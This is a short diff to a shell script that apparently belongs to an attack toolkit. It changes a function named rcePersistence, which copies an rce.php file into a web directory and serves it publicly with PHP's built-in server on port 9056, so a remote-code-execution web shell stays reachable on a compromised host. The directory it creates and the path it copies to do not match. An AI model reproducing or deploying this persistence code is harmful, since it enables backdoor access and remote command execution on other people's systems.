@@ -137,7 +137,7 @@ rcePersistence() {
     PORT=9056 
     mkdir /var/www/html/dynasty_rce 
     cp rce.php /var/www/dynasty_rce/rce.php 
-    cd /var/www/html
+    cd /var/www/html/dynasty_rce 
     php -S 0.0.0.0:$PORT & 
 }
 
